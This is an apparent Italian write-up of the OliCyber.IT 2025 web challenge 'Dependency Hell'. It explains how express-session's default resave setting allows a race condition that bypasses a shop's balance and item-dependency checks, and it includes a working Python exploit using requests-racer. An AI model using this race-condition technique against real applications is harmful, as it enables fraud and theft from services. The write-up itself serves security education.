# OliCyber.IT 2025 - Competizione nazionale

## [web] Dependency Hell (3 solves)

Voglio comprare la flag, ma non ho abbastanza chiavi!

[https://dependency-hell.challs.olicyber.it](https://dependency-hell.challs.olicyber.it)

Author: Lorenzo Leonardini <@pianka>

## Panoramica

La challenge si presenta come un negozio online, con 4 oggetti disponibili:

- chiave rossa
- chiave verde
- chiave blu
- flag

Per acquistare gli oggetti esiste una sorta di sistema di dipendenze: per comprare la flag serve la chiave blu, per comprare la chiave blu serve la chiave verde, e per comprare la chiave verde serve la chiave rossa.

Abbiamo saldo sufficiente solo per acquistare 2 oggetti.

## Soluzione

Se consultiamo la documentazione di `express-session`, troviamo alcune opzioni interessanti:

> **resave**
> Forces the session to be saved back to the session store, even if the session was never modified during the request. Depending on your store this may be necessary, but **it can also create race conditions** where a client makes two parallel requests to your server and changes made to the session in one request may get overwritten when the other request ends, even if it made no changes (this behavior also depends on what store you're using).
>
> **The default value is true**, but using the default has been deprecated, as the default will change in the future.

Dato che l'opzione `resave` non è specificata, e il default è a `true`, come dice la documentazione, l'applicazione potrebbe essere vulnerabile a race conditions.

Dobbiamo solamente fare in modo che il server gestisca due richieste allo stesso tempo: una alla home page, usata per risalvare il nostro corrente saldo, e una all'endpoint `/buy`, per comprare l'oggetto che vogliamo.

## Exploit

Per effettuare la race, usiamo la libreria [requests-racer](https://github.com/nccgroup/requests-racer). Nota: non funziona con l'ultima versione di Python.

```py
#!/usr/bin/env python3

import os
import requests
from requests_racer import SynchronizedAdapter

URL = os.environ.get("URL", "https://localhost:3000")
if URL.endswith("/"):
    URL = URL[:-1]

s = requests.Session()
s.get(f'{URL}')

sync = SynchronizedAdapter()
s.mount('http://', sync)
s.mount('https://', sync)

pw = None

# we buy one item at the time
for part in ['red_key', 'green_key', 'blue_key', 'flag']:
    s.get(f'{URL}')
    r = s.post(f'{URL}/buy', json={'item': part, 'key': pw})

    # race!
    sync.finish_all()

    data = r.json()
    print(data)
    if not 'message' in data:
        exit(1)

    if 'bought the flag' in data['message']:
        print(data['item'])
        exit(0)

    pw = data['item']
```
